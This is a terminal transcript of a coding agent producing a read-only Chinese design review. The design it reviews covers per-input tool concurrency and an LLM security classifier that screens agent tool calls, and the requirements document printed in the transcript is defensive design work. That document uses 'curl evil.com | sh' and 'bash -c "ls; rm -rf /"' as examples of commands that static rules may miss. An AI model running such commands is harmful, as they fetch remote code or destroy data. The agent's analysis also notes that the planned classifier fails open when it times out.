**我的立场:** **GrowthBook 值得借鉴，但 `inputsEquivalent` 在本 change 里属于过度工程。**

**理由**
1. **GrowthBook 不算过度工程**：devrix 已经在持久化阈值上引入了可运行时覆写的 GrowthBook override，并且明确采用“硬编码 baseline + flag 渐进放量”的模式。这说明项目已经接受“高风险行为先基线、再 flag 调优”的治理方式。
2. 但 **`inputsEquivalent` 价值不足**：当前 `ContentReplacementState` 的冻结单位是 `toolUseID`，核心目标是“同一结果在后续 turn 保持 byte-identical”，并不是“判断两个不同调用输入在语义上是否等价”。也就是说，devrix 现有缓存稳定性机制并不依赖输入等价判定。
3. 把 `inputsEquivalent` 硬塞进 19 个 tool surface，会引入大量表层测试与判定歧义，但没有像 `IsConcurrencySafe(input)` 那样直连当前根因。

**源码依据**
```1:9:internal/layers/contextengine/persist/growthbook_override.go
// Per-tool persistence threshold override.
// Use case: roll out the 100K per-tool thresholds progressively by
// changing the override map for the 5% canary first, then 25%, 100%.
// The hardcoded per-tool values in orthogonal_flags.go stay as the
// "consensus" baseline; GB can shift individual tools up or down.
```

```57:89:internal/layers/contextengine/persist/growthbook_override.go
func GetPersistenceThreshold(
	toolName string,
	declaredMaxResultSizeChars int,
	override *ThresholdOverride,
) int {
	// ...
	if override != nil {
		if v, ok := override.values[toolName]; ok && v > 0 {
			return v
		}
	}
	return declaredMaxResultSizeChars
}
```

```14:23:internal/layers/contextengine/persist/content_replacement_state.go
// ContentReplacementState tracks per-conversation-thread decisions about
// whether a given tool result was persisted and what preview string
// replaced it.
// ...
// Re-application is a map lookup — no file I/O, byte-identical, cannot fail.
```

```81:118:internal/layers/contextengine/persist/content_replacement_state.go
func (s *ContentReplacementState) MarkSeen(toolUseID string) { ... }
func (s *ContentReplacementState) Lookup(toolUseID string) (string, bool) { ... }
func (s *ContentReplacementState) RecordReplacement(toolUseID, replacement string) { ... }
```

**反方意见**
- `inputsEquivalent` 能让未来缓存失效、去重、retry 判定更优雅，先占位后续会省事。
- GrowthBook 默认全关也可能沦为死代码。

**我的回应**
- GrowthBook 已有同类先例，且主要是运维治理接口，保留是合理的。
- `inputsEquivalent` 则没有同等强度的“现有架构缺口”证据。它更像 clawcode 工具框架里的通用便利字段，不是当前 devrix 这次 change 的核心矛盾。  
- 我的建议是：**AC11 保留，AC14 降级为后续 P2/P3 候选，不在本次主线强绑定。**

---

## 共识诉求（与 Claude 一致）
1. **必须从静态 `ConcurrencySafe bool` 走向 `per-input` 判定**，否则无法真正解决 Bash/混合批次问题。
2. **auto-mode classifier 不能替代 VerifyContract 4 元组**；Verify 仍是 ground truth。
3. **4 项 tech-debt 应在本 change 范围内收口**，至少在 OpenSpec 叙事上合并处理。
4. **`inputsEquivalent` 的优先级明显低于并发判定和 classifier 主链。**

---

## 争议点（与 Claude 不一致）
1. **PR 粒度**：Claude 倾向 5 PR，我也倾向 5 PR，但我的理由更强烈，不是“足够紧凑”，而是 **D/E 分拆会制造不稳定中间态**。
2. **GrowthBook 价值判断**：Claude 认为默认全关导致其偏“死代码”，建议降 P2；我不同意。  
   现有 `persist/growthbook_override.go` 已证明 devrix 接受这类“baseline + runtime override”机制，所以 **AC11 不是外来异物，而是既有治理模式的横向复用**。
3. **auto-mode classifier 的必要性强度**：Claude 是“可做但默认关”；我更强一点，认为它是**结构上必要**，因为它补的是当前执行前防线空洞，而不只是可选增强。

---

## 关键风险评估（高 → 低）

- **P0: Bash 输入误判导致错误并发**  
  静态 `bash=true` 已经偏粗；若迁移到 `IsConcurrencySafe(input)` 但 read-only 判定不稳，会把真实写命令并发化，风险最高。证据见 `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags.go:52-53` 与 `internal/layers/contextengine/enforce/tools/surface/builtin_surface.go:136-143`。

- **P0: classifier 定位错误，越权替代主权限链**  
  如果 auto-mode classifier 被实现成“最终裁决”，会破坏 `surface.CheckPermission -> IPermissionGate -> Execute -> Verify` 的层次。证据见 `internal/bootstrap/turn_adapter.go:355-399` 与 `internal/layers/orchestration/executionflow/verify/verify_contract.go:54-66`。

- **P1: `per-input` 逻辑落在各 surface 后，表驱动审查性下降**  
  当前很多 metadata 通过真值表和 gate 测试保障；新函数若散落实现，review 成本上升。证据见 `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags.go:10-16` 与 `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_test.go:225-229`。

- **P1: 5s classifier timeout + 默认关闭导致“长期不实战”**  
  不是架构错误，而是产品化风险。若没有明确 rollout/telemetry，容易常年处于名义存在、实际无人依赖状态。

- **P2: `inputsEquivalent` 引入大量低信号测试与判定分歧**  
  现有 `ContentReplacementState` 没有输入等价依赖；硬加后测试数会放大，但收益不确定。证据见 `internal/layers/contextengine/persist/content_replacement_state.go:14-23`、`81-118`。

---

## clawcode 35 字段借鉴关系评分

### 高分借鉴（应采纳）
- **`isConcurrencySafe(input)`** — **9/10**  
  与 devrix 当前静态并发判定缺口直接对应，是本 change 的核心治本点。
- **`toAutoClassifierInput(input)`** — **8.5/10**  
  为 classifier 提供紧凑投影，避免把完整 transcript 粗暴送入 LLM，和 devrix 的中间防线需求强匹配。
- **fail-closed defaults / explicit gate 思路** — **8/10**  
  devrix 已有 `T14` 风格的 no-silent-default gate，和 clawcode 的默认值治理理念相容。
- **runtime override / feature-flag 治理思路** — **7.5/10**  
  devrix 已在 `persist/growthbook_override.go` 落地同类模式，扩到 classifier/concurrency 是自然延伸。

### 中性借鉴（可选，需裁剪）
- **Tool-level projection / compact block 序列化** — **7/10**  
  值得做，但要限定输入范围，只服务 classifier，不要演化成“把所有 transcript 智能重编码”的大工程。
- **sibling abort / discard 语义** — **7/10**  
  对执行器闭环有价值，但属于“把系统补完整”，不是 change 的最强主线。

### 应拒绝或后移
- **`inputsEquivalent(a, b)`** — **3.5/10**  
  在 clawcode 里是通用工具框架字段；在 devrix 当前架构里，没有对应的迫切缺口，也未被现有 `ContentReplacementState` 所需要。
- **大而全的 35 字段接口哲学** — **4/10**  
  clawcode 的强项是工具框架工程化，但 devrix 明显更偏 “少字段 + 明确 SoT + gate 测试”。一次性引入过多字段会稀释当前契约清晰度。
- **将 UI/render/search 等大量 tool chrome 元数据整体迁入 devrix** — **2/10**  
  这不是本 change 的问题空间，也不符合当前 devrix 的最小必要扩展原则。

---

## 结论
如果只给一句结论：**应采纳 clawcode 的“按输入判定并发 + classifier 输入投影 + 运行时 flag 治理”这三件事，但不能照搬它的大接口哲学。**

更具体地说：

- **支持**：`per-input IsConcurrencySafe`、默认关闭的 auto-mode classifier、4 项 tech-debt 同 change 收口、GrowthBook override。
- **反对强推**：把 `inputsEquivalent` 作为本 change 的正式主目标。
- **建议裁决**：实施上走 **5 PR**，并把 `classifier + tests + telemetry + e2e` 做成一个原子 PR。

exec
/bin/zsh -lc 'cat "/Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-codex.md"' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
Reading additional input from stdin...
OpenAI Codex v0.133.0
--------
workdir: /Users/fukai/workspace/devrix
model: MiniMax-M2.7
provider: custom
approval: never
sandbox: workspace-write [workdir, /tmp, $TMPDIR]
reasoning effort: high
reasoning summaries: none
session id: 019f2278-29ed-7b62-8401-22b710f066a2
--------
user
你是 devrix 项目的 codex，需要对 DM-20260702-009 (D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier + Tech-Debt Closure) 做**独立博弈论分析**。

工作目录: /Users/fukai/workspace/devrix
必读:
- openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/demand.md (S1 需求全文)
- openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-claude.md (Claude 的分析，**仅供参考，不要照抄**)
- openspec/tech-debt/streaming-tool-executor-v2.md (TD-STE-01~06 现状)
- internal/shared/contracts/tool_surface.go (现 interface 9 字段)
- 借鉴资料: /Users/fukai/brain/01知识探索/项目/20260620-certain-architecture/core-concepts/53-clawcode-tools-design.md (clawcode Tool 35 字段)

5 个博弈点（必须各给独立立场）:
1. **per-input 函数** (clawcode 路线 `Tool.isConcurrencySafe(input): boolean`) vs **字段化 metadata** (devrix 偏好声明式 spec)
2. **auto-mode classifier 是否必要** — 5s timeout 硬上限 + 默认关闭 + VerifyContract 4 元组是 ground truth
3. **tech-debt 收口策略** — TD-STE-01/02/03/06 4 项一起收 vs 分批
4. **PR 拆分粒度** — 6 PR (A/B/C/D/E/F) vs 5 PR 合并 PR-D/PR-E
5. **GrowthBook (P0 AC11) + inputsEquivalent (P2 AC14)** 借鉴 clawcode 是否过度工程

**要求**: 输出 markdown 格式的独立分析到 stdout，包含:
- 每个博弈点: 立场 + 理由 + `file:line` 引用 (从 devrix 源码) + 反方意见
- 共识诉求 (跟 Claude 一致的点)
- 争议点 (跟 Claude 不一致)
- 关键风险评估 (高→低排序, 标 P0/P1/P2)
- clawcode 35 字段借鉴关系评分

**绝对不要修改任何文件**, 只输出到 stdout。
codex
Reading the required source documents now.

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/demand.md' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# Demand: DM-20260702-009 — D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier + Tech-Debt Closure

**Demand ID:** DM-20260702-009
**Created:** 2026-07-02
**Priority:** P1
**Source:** 复盘 DM-20260702-008 P1 延期 (9 T) + DM-20260701-007 借鉴关系 10 项 + openspec/tech-debt/streaming-tool-executor-v2.md (TD-STE-01~06) + clawcode Tool interface 35 字段 (doc 53) + 复盘清单 6 项审计 → **13 T 点全纳入**

---

## 1. 问题陈述 (复盘 DM-20260702-008 P1)

DM-20260702-008 (Token Design 2.0, PR #376 已合并) 在 16 P0 T 点全量 IMPLEMENTED 后, 把 9 P1 T 点 (T16-T24) 明确延期到本 change. 复盘发现 2 个**未根治的次治本问题**:

### 1.1 根因 1 (RC-1): `ConcurrencySafe bool` 是 v2 静态字段, 不是 per-input 决策

devrix 现状 (`internal/shared/contracts/tool_surface.go:39-43`):

```go
// ConcurrencySafe: multiple invocations of the same tool may run in parallel
// without mutual interference (e.g. read_file on different paths).
ConcurrencySafe bool
```

- **问题**: 静态 bool, **per-tool**, 不知道具体 input
  - `bash` 永远 `ConcurrencySafe=false` (因为能 `rm -rf`), 但 `bash` 跑 `ls -la` 完全可以并发
  - `read_file` 永远 `ConcurrencySafe=true`, 但 read_file 一个 1GB 文件 8K 截断会触发 8 次串行, 浪费并发
- **后果**:
  - turn_adapter.ExecuteRound (`turn_adapter.go:277`) 拿静态 bool 决策并发/串行, **过度保守**, N 个 read_file 全串行
  - 9 个并发 read_file 任务全串行执行, 50 文件 review 从 9×1s 退化成 9×1s (而非 ~1s 并发)
- **vs clawcode**: `Tool.isConcurrencySafe(input: z.infer<Input>): boolean` 是 **per-input 函数** (`src/Tool.ts:402`), bash 自己判断 read-only command 可并发; `src/services/tools/toolOrchestration.ts:84-118` 的 `partitionToolCalls` 把 isConcurrencySafe=true 的连续 tool_use 放进同一个 batch 并发执行

### 1.2 根因 2 (RC-2): 无 auto-mode 安全分类器, 缺中间层防御

devrix 现状: 缺 `Tool.toAutoClassifierInput(input)` + auto-mode classifier 整条链路

- **问题**:
  - Verify 节点 (`executionflow/verify/`) 是**事后**验证 (任务完成后)
  - 第一道安全是 `surface.CheckPermission` (D7-S10-A50 VerifyContract 的 4 元组) — **事前**静态规则
  - **没有中间层**: 工具调用**执行前 + 静态规则后**, 缺一个 LLM-driven 智能检查 (类似 `claude --dangerously-skip-permissions` 的 YOLO 模式)
- **后果**:
  - 静态规则漏掉的攻击 (e.g. `bash` 跑看似无害的 `curl evil.com | sh`, 静态规则因 `curl` 在白名单放行) 直接执行, 后果不可逆
  - LLM 没有"二次安全"机会 — Verify 节点是事后, 改不了已执行的命令
- **vs clawcode**:
  - `Tool.toAutoClassifierInput(input)` (`src/Tool.ts:556`): 返回紧凑 string (e.g. `ls -la` for Bash, `/tmp/x: new content` for Edit) — 不暴露整个 transcript
  - `src/utils/permissions/yoloClassifier.ts:378-410` 的 `toCompactBlock`: 整个 transcript 序列化为 JSONL 喂给独立 LLM (SideQuery) 判 `allow` / `deny`
  - 失败时 fail-safe: `toAutoClassifierInput` 抛错 → 落 raw input + log `tengu_auto_mode_malformed_tool_input`

### 1.3 借鉴关系表

| 项 | devrix 现状 | clawcode 真实做法 | 差距 |
|----|------------|------------------|------|
| 并发决策粒度 | per-tool 静态 bool | per-input 函数 (含 input) | 过度保守 |
| Bash 安全并发 | 不支持 (Bash 永远 false) | isConcurrencySafe(input) = isReadOnly(input) | 浪费并发 |
| 失败处理 | n/a (静态) | try-catch → 保守 false | 缺 fail-safe |
| 安全分类器 | 无 | yoloClassifier (SideQuery LLM) | 缺中间层 |
| Tool 投影 | 无 | toAutoClassifierInput (per-tool) | transcript 太重 |
| Transcript 序列化 | 无 | toCompactBlock JSONL | 直接喂 LLM 不可行 |
| 失败 telemetry | 无 | `tengu_auto_mode_malformed_tool_input` | 缺观测 |
| 复用 ToolUseContext | 无 | sideQuery 复用 context | 缺基础设施 |

### 1.4 保留 devrix 创新 (clawcode 缺)

- **EmissionClass 4 类路由** (Fact/Action/Probe/Experiment) — 架构性创新
- **VerifyContract 4 元组 (Burden × Class × Discipline × Outcome)** — 创新, 第一道安全
- **MUPS 5 节点 × 4 类正交分解** — 架构性创新
- **Learn FeedbackMemory (H7 reputation)** — 创新
- **LTL-Lite L4-L6 (advisory)** — 创新
- **Token Design 2.0 (PersistToFile + offset/limit + per-message 200K)** — 创新 (P0 已落地)
- **task_kind 推 Filter v2** — 创新
- **ConvergenceContract / IterationBound / SourceUncertainty 4 control plane** — 创新 (P0 已落地)

### 1.5 复盘清单 (2026-07-02 审计) — 6 项吸收到本 change

复盘之前 discussion 留下的 6 项未实现项, 全部吸收进本 change (T25-T28 4 个新 T 点 + 2 项 tech-debt 关闭):

| # | 项 | 原状态 | 吸收路径 |
|---|----|--------|----------|
| 1 | **GrowthBook runtime override** | DM-20260702-008 借鉴关系 #8 标 P2, 未归任何 change | **T25 GrowthBook flag 集成** (per-tool 阈值 + classifier + concurrency 都可接, 默认关闭) |
| 2 | **TD-STE-01 混合批次并发** | openspec/tech-debt/streaming-tool-executor-v2.md P1, 未关 | **T18 partitionToolCalls 显式 close** (batch 间串行 + batch 内并发) |
| 3 | **TD-STE-06 ConcurrencySafe 注册表** | tech-debt P2, 未关 | **T16-T17 显式 close** (per-input `IsConcurrencySafe` + 19 工具 surface 默认) |
| 4 | **TD-STE-02 Bash sibling abort** | tech-debt P1, 未归任何 change | **T26 BashTool abort 兄弟并行 + synthetic tool_result** |
| 5 | **TD-STE-03 discard on fallback** | tech-debt P1, 未归任何 change | **T27 StreamingToolExecutor.Discard()** (依赖 TD-QL-03 已 CLOSED) |
| 6 | **clawcode Tool.inputsEquivalent** | 35 字段中未在 devrix 落地的字段, 跟 ContentReplacementState 联动 | **T28 inputsEquivalent** (cache invalidation 收口) |

---

## 2. 目标

### 2.1 治本目标 (per-input 决策 + 智能中间层)

| 目标 | 衡量 | 现状 | 目标 |
|------|------|------|------|
| Bash 只读可并发 | N 并发 `git status` 延迟 | 全串行 (9×1s) | 1×1s (1 batch) |
| Read 并发粒度 | N 并发 `read_file` 延迟 | 全串行 | 1 batch 并发 |
| Fail-safe | `isConcurrencySafe` 抛错时 | n/a | 保守 false (不并发) |
| 工具投影 | `toAutoClassifierInput` 覆盖率 | 0/19 | 19/19 全覆盖 |
| Auto-mode classifier | 中间层防御 | 无 | LLM SideQuery + 5s timeout |
| 失败 telemetry | `auto_mode_malformed_tool_input` 事件 | 0 | ≥1 per 异常 |
| 端到端 e2e | 50 文件 review 用并发 (clawcode `partitionToolCalls`) | 串行 ~150 calls 串行 | ~30 batches 并发 |

### 2.2 保留目标 (P0 已落地的 16 T 不动)

- Token Design 2.0 (PersistToFile + offset/limit + per-message 200K)
- ToolSpec v3 6 control plane 字段 (EmissionClass / ConvergenceContract / IterationBound / SourceUncertainty / MaxResultSizeChars / TruncateMarkerText)
- VerifyContract 4 元组 (第一道安全, 不动)
- EmissionClass 4 类路由 (不动)
- task_kind 推 Filter v2 (不动)
- Learn FeedbackMemory (不动)
- LTL-Lite L4-L6 advisory (不动)
- MUPS 5 节点 × 4 类正交分解 (不动)

### 2.3 不在本次目标 (走下个 change)

- Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- 多 LLM ensemble (ensemble classifier) — P3
- 跨 session reputation → classifier input — P2 (跟 Learn FeedbackMemory 联动)
- Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- D1/D3/D4/D6 域元数据 (DM-20260701-007 OOS-8) — 域自治

---

## 3. 验收标准

| ID | 标准 | 优先级 | 验证 |
|----|------|--------|------|
| AC1 | `ToolSurface` 加 `IsConcurrencySafe(input []byte) bool` 方法, 19 工具全部默认实现 (per-input 决策) | P0 | 19 工具 surface_test PASS |
| AC2 | `ToolSurface` 加 `ToAutoClassifierInput(input []byte) string` 方法, 19 工具全部默认实现 | P0 | 19 工具 surface_test PASS |
| AC3 | `ChannelRouter.ExecuteRound` (`turn_adapter.go:277`) 改造为 `partitionToolCalls`-style: 把 `IsConcurrencySafe=true` 的连续 tool_call 放进同 batch, batch 内并发, batch 间串行 | P0 | 50 文件 e2e: 50 read_file 拆成 ~10 batch, 总延迟 < 串行 / 5 |
| AC4 | Auto-mode classifier (`internal/layers/orchestration/decisionplanning/auto_classifier.go` 新建): 接收 `toCompactBlock` JSONL transcript, 调 SideQuery (5s timeout), 返 `allow` / `deny` + reason | P0 | 7 单测 (allow/deny/timeout/throw/malformed_input/empty_transcript/policy_violation) |
| AC5 | `tengu_auto_mode_malformed_tool_input` 对等 telemetry 事件 (devrix 用 `auto_mode.malformed_tool_input` metric) | P0 | metric_test PASS |
| AC6 | Fail-safe: `IsConcurrencySafe` 抛错时保守 false (不并发); `ToAutoClassifierInput` 抛错时落 raw input + emit metric | P0 | 2 单测 |
| AC7 | Bash 工具: `isReadOnly(input) → IsConcurrencySafe(input) = true` (镜像 clawcode `BashTool.tsx:434-437`) | P0 | bash_runner_test |
| AC8 | 19 工具 default ToAutoClassifierInput 走 registered surface 而非 hardcoded fallback (避免 silent default) | P0 | surface_metadata_gate_test 加 1 case |
| AC9 | 13 T 点 (T16-T28) 全 IMPLEMENTED, 走 D2-S15-A02 + D7-S9-A50 + D7-S10-A50 + D7-S11-A50 t-registry | P0 | t-registry + tasks.md |
| AC10 | 端到端 e2e: 50 文件 review + 9 并发 read_file batch, 任务完成时间 < 串行 / 3 | P0 | review50_e2e_test.go 加并发版本 |
| AC11 | **GrowthBook override** — 19 工具 per-tool 阈值 + Classifier enable + ConcurrencySafe 全部可走 GrowthBook feature flag 运行时调, 默认全关 | P0 | growthbook_override_test + 19 工具 default + Production-Safety |
| AC12 | **Bash sibling abort** — 并行 Bash 中一个失败, 兄弟 Bash 通过 `siblingAbortController` abort + 返 synthetic `Cancelled: parallel tool call errored` tool_result | P1 | bash_sibling_abort_test (mock 双 Bash, 第一个 error → 第二个 cancelled) |
| AC13 | **Discard on fallback** — QueryLoop fallback model 切换前调 `StreamingToolExecutor.Discard()`, 在途/queued 工具注入 `streaming_fallback` synthetic result | P1 | discard_test (fallback 路径无 orphan tool_use) — 依赖 TD-QL-03 已 CLOSED |
| AC14 | **inputsEquivalent(a, b)** — 19 工具 surface 加 `inputsEquivalent(a, b []byte) bool` 默认实现, 配合 ContentReplacementState (T04) 实现 cache invalidation 收口 | P2 | inputs_equivalent_test (19 工具 × 3 case = 57 单测) |

---

## 4. 依赖与约束

| 类型 | 内容 |
|------|------|
| **上游依赖** | DM-20260702-008 (Token Design 2.0 已合) 提供 PersistToFile 持久化 (本 change 的 SideQuery transcript 可用 PersistToFile 兜底) |
| **上游依赖** | DM-20260701-007 (MUPS ToolSpec v3) 提供 6 control plane 字段 (本 change 的 `IsConcurrencySafe`/`ToAutoClassifierInput` 是 ToolSurface interface 新方法, 不冲突) |
| **上游依赖** | DM-20260618-001 (Tool Spec v2) 提供 9 字段基线 (本 change 扩展 surface interface, 0 break) |
| **上游依赖** | `Learn FeedbackMemory` (DM-20260701-007 P1) 提供 reputation data (本 change 暂不联动, P2 走) |
| **约束** | ToolSpec v3 struct 不能加新字段 (会 break 9 → 15 字段的命名约定), 新方法必须走 `ToolSurface` interface, 不进 ToolSpec |
| **约束** | `IsConcurrencySafe` 必须 fail-safe (抛错 → false, 不并发), 不能 panic 上抛到 ExecuteRound |
| **约束** | `ToAutoClassifierInput` 抛错 → log metric + 落 raw input, 不能 panic 上抛 |
| **约束** | 13 T 点 (T16-T28) = 10 项 P0 (T16-T25) + 2 项 P1 (T26/T27) + 1 项 P2 (T28), P0 全 P0 验收 (符合 P0 阻断条件) |
| **约束** | Classifier LLM SideQuery 5s timeout (硬上限, 不可改) |
| **约束** | 0 业务代码 out-of-scope diff (跟 Token Design 2.0 收口 PR #376 同样的纪律) |
| **约束** | T26 Bash sibling abort 不能 abort 父 QueryLoop turn, 只 abort 同 batch 兄弟 |
| **约束** | T27 discard on fallback 依赖 TD-QL-03 (已 CLOSED, DM-20260618-010), 不依赖未关闭的 tech-debt |
| **约束** | T25 GrowthBook 默认全关, Production-Safety: 不能在未 flag 开启时影响用户行为 |

---

## 5. 变更范围

### 5.1 新增 (新建)

- `internal/shared/contracts/tool_surface_v4.go` (interface 扩展方法)
- `internal/layers/orchestration/decisionplanning/auto_classifier.go` (新建 classifier)
- `internal/layers/orchestration/decisionplanning/auto_classifier_test.go` (7+ 单测)
- `internal/layers/orchestration/decisionplanning/to_compact_block.go` (JSONL transcript 序列化)
- `internal/layers/orchestration/decisionplanning/to_compact_block_test.go`
- `internal/layers/bootstrap/turn_adapter_partition_test.go` (50 文件 e2e 并发版本)
- `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_v2.go` (per-tool IsConcurrencySafe/ToAutoClassifierInput 19 工具默认)
- `internal/layers/observability/instrument/growthbook/` (新建, GrowthBook override registry)
- `internal/layers/observability/instrument/growthbook/persist_threshold_override.go` (T04 ContentReplacementState GrowthBook 联动)
- `internal/layers/observability/instrument/growthbook/concurrency_override.go` (T16-T17 IsConcurrencySafe GrowthBook 联动)
- `internal/layers/observability/instrument/growthbook/classifier_override.go` (T22-T23 AutoModeClassifier GrowthBook 联动)
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` (T26 BashTool abort 兄弟并行)
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort_test.go`
- `internal/bootstrap/discard_on_fallback.go` (T27 StreamingToolExecutor.Discard())
- `internal/bootstrap/discard_on_fallback_test.go`
- `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent.go` (T28 per-tool inputsEquivalent 默认)
- `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent_test.go` (19 工具 × 3 case)

### 5.2 修改 (扩展)

- `internal/layers/contextengine/enforce/tools/surface/*.go` — 19 surface 加 `IsConcurrencySafe` / `ToAutoClassifierInput` / `inputsEquivalent` 默认实现
- `internal/bootstrap/turn_adapter.go:277` — `ExecuteRound` 改造为 `partitionToolCalls`-style batch
- `internal/layers/contextengine/enforce/tools/surface/surface_metadata_gate_test.go` — 加 AC8 case
- `internal/layers/orchestration/decisionplanning/classifier.go` — `IntentClassifier` 加 `ClassifyToolUse(transcript, sideQuery) YoloResult` 方法
- `internal/layers/contextengine/enforce/tools/bash/bash_runner.go` — `BashTool` 集成 `siblingAbortController` (T26)
- `internal/bootstrap/streaming_executor.go` (新建) — `Discard()` 方法 + fallback 路径 wiring (T27)
- `openspec/tech-debt/streaming-tool-executor-v2.md` — TD-STE-01/02/03/06 closed-by 标注
- `openspec/specs/d2-context-engine/t-registry.md` — D2-S15-A02-T16..T28 注册
- `openspec/specs/d7-orchestration/t-registry.md` — D7-S9-A50-T16..T19 + D7-S10-A50-T20..T24 + 新 T26-T28 注册
- `openspec/specs/d3-llm-gateway/t-registry.md` — D3-S3-A01 SideQuery 5s timeout + retry + budget 注册
- `openspec/t-registry.md` — v5.15.0 主索引 +13 T

### 5.3 不变更 (0 业务代码 out-of-scope diff 原则)

- ToolSpec v3 struct (6 control plane 字段不动, 0 break)
- 已合入 P0 T01-T15 + T25-T28 (Token Design 2.0 16 T 全保留)
- EmissionClass 4 类路由 (不动)
- VerifyContract 4 元组 (第一道安全, 不动)
- MUPS 5 节点 × 4 类正交分解 (不动)

---

## 6. 风险评估

| 风险 | 影响 | 缓解 |
|------|------|------|
| Bash `isReadOnly` 误判 (e.g. `bash -c "ls; rm -rf /"`) 触发并发 | 高 — 误把 destructive bash 标并发 | `BashTool.isReadOnly` 必须 parse 整个 command tree (仿 clawcode parseForSecurity), 不可靠时保守 false |
| `IsConcurrencySafe` 抛错 → panic 上抛到 ExecuteRound | 高 — turn 崩溃 | fail-safe: catch + log metric + return false, 已 AC6 覆盖 |
| Auto-mode classifier LLM 幻觉 (返 allow 但实际 deny) | 中 — 安全漏判 | 5s timeout 硬上限 + 不替换 VerifyContract 4 元组 (它是 ground truth) + auto-mode 默认关闭 (P2 再开) |
| `ToAutoClassifierInput` 抛错 → 上抛, ExecuteRound 中断 | 中 — turn 崩溃 | fail-safe: catch + emit metric + fall back to raw input (AC6) |
| Bash `parseForSecurity` 性能 (每 tool_call 都 parse) | 低 — 单 turn 几 ms | 缓存 parse 结果 (per toolUseID) + 拒绝超长 command (>10K chars) |
| SideQuery LLM 不可用 (网络/CK) | 中 — auto-mode 失能 | 5s timeout 后默认 allow (fail-open) + metric `auto_mode.classifier_unavailable` + 不替换 VerifyContract |
| 19 工具 surface 改 IsConcurrencySafe 默认 → 破坏现有并发行为 | 中 — 现有 turn 变串行 | AC1 强制 19 工具默认保持 v2 的 `ConcurrencySafe` 行为, per-input 只在显式 override 时生效 |
| transcript 序列化 leak 隐私 (含 user message, file content) | 中 — PII 风险 | toCompactBlock 只投影 tool_use 块, 不投影 tool_result 内容, 跟 clawcode 一致 |

---

## 7. 关联需求

### 7.1 Supersede (narrow)

- 无 (本 change 是增量, 不撤回任何已合 P0 T)

### 7.2 Related (上游 — 已合)

- DM-20260702-008 (Token Design 2.0) — 提供 PersistToFile (classifier transcript 可用)
- DM-20260701-007 (MUPS ToolSpec v3) — 提供 6 control plane 字段 (不冲突, 本 change 加 ToolSurface interface 新方法)
- DM-20260618-001 (Tool Spec v2) — 提供 9 字段基线 (v4 加 interface 方法, 0 break)
- DM-20260618-002 (Surface Permission Extension) — VerifyContract 4 元组 (本 change 第二道安全, 跟 auto-mode 互补)
- DM-20260618-003 (Surface Lazy Loading) — DeferLoading (不冲突)

### 7.3 Related (前置)

- DM-20260629-001 (D7 DSAFT restructuring) — Span Evidence 100%
- DM-20260625-019 (D7 5-node coverage) — MUPS Phase 3 PR-C1 跨域类型
- DM-20260626-005 (D7 6S Verify promotion) — executionflow/verify/ 物理 promote

### 7.4 Related (下游 — 走 P2/P3 后续 change)

> OOS 编号 OOS-NEW-1~10 (跟 tasks.md + proposal.md 同步), 原 OOS-1 (GrowthBook 走 T25) + TD-STE-01/02/03/06 (4 项 tech-debt 关闭) + inputsEquivalent (走 T28) 已吸收到本 change.

- OOS-NEW-1: Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- OOS-NEW-2: 多 LLM ensemble (ensemble classifier) — P3
- OOS-NEW-3: 跨 session reputation → classifier input — P2
- OOS-NEW-4: Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- OOS-NEW-5: LLM SideQuery 模型选择 (Haiku vs Sonnet) — P2
- OOS-NEW-6: YoloClassifier telemetry 跟 Learn FeedbackMemory 联动 — P2
- OOS-NEW-7: 工具 progress 流 (TD-STE-04) — P2
- OOS-NEW-8: synthetic error 统一 (TD-STE-05) — P2
- OOS-NEW-9: Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- OOS-NEW-10: Filter v2 workspace 维 (DM-20260701-007 OOS-10) — 走 P1 独立 change

---

## 8. 路线图 (6 PR 收口)

| PR | 范围 | T 点 | AC | tech-debt closed | 估时 |
|----|------|------|-----|------------------|------|
| **PR-A** | `ToolSurface` interface v4 + 19 工具 `IsConcurrencySafe` 默认实现 | T16-T17 | AC1/AC2/AC8 | TD-STE-06 | W1 D1-D2 |
| **PR-B** | `ExecuteRound` partitionToolCalls 改造 + 50 文件 e2e 并发版 | T18-T19 | AC3/AC10 | TD-STE-01 | W1 D3-D5 |
| **PR-C** | `ToAutoClassifierInput` + 19 工具默认实现 | T20-T21 | AC2/AC4 | — | W2 D1-D2 |
| **PR-D** | Auto-mode classifier + toCompactBlock + ChannelRouter 集成 | T22-T23 | AC4/AC5/AC6/AC7 | — | W2 D3-D4 |
| **PR-E** | Classifier 测试 + telemetry + 端到端 e2e | T24 | AC1-AC10 | — | W2 D5 |
| **PR-F** | GrowthBook override + Bash sibling abort + Discard on fallback + inputsEquivalent | T25-T28 | AC11/AC12/AC13/AC14 | TD-STE-02 + TD-STE-03 | W3 D1-D2 |
| **合计** | 6 PR squash merge | 13 T + 14 AC | — | 4 tech-debt | 1 周 + 2 天 |

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-claude.md' in /Users/fukai/workspace/devrix
exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/openspec/tech-debt/streaming-tool-executor-v2.md' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# Claude 博弈论分析 — DM-20260702-009

**日期:** 2026-07-02
